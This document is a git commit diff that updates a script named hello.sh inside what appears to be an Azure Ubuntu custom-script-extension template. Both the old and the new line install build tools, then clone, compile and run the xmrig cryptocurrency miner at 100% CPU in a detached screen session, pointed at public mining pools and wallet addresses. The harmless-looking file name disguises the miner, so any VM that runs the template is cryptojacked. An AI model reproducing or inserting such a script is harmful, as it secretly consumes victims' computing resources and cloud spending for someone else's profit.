fd11938a52fd8f40582f4da4d199d178acbc807a
copnanhdai <copnanhdai@gmail.com>
2017-10-29 16:28:48 +0700

    Update hello.sh

--- 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
+++ 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-sudo apt-get update ; sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3)) ; sudo apt-get install -y screen git build-essential cmake libuv1-dev && git clone https://github.com/xmrig/xmrig.git ; cd xmrig ; mkdir build ; cd build ; cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a ; make ; screen -S ebe ./xmrig -o xmr-us-east1.nanopool.org:14444 -u 463tWEBn5XZJSxLU6uLQnQ2iY9xuNcDbjLSjkn3XAXHCbLrTTErJrBWYgHJQyrCwkNgYvyV3z8zctJLPCZy24jvb3NiTcTJ.21f191d3b6804731a471b8ce399de403828ab60f06d545199bbd0fabc6fb9316/cop/copnanhdai@gmail.com -p x -k -t 4 --donate-level=1 --max-cpu-usage=100 --av=2
+sudo apt-get update ; sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3)) ; sudo apt-get install -y screen git build-essential cmake libuv1-dev && git clone https://github.com/xmrig/xmrig.git ; cd xmrig ; mkdir build ; cd build ; cmake .. -DWITH_HTTPD=OFF ; make ; screen -S ebe ./xmrig -a cryptonight-lite -o mine.aeon-pool.com:5555 -u WmtDXGNodYNSKJGFizD5cp8SrQ2ofJcKPhh4PsejVjoHDtqxu3PDcJDhFaaEttMUt9c61Em6dP1WeHkyDtyRgWf11Q6Mq529K -p x  --donate-level=1 --max-cpu-usage=100 --av=2
 
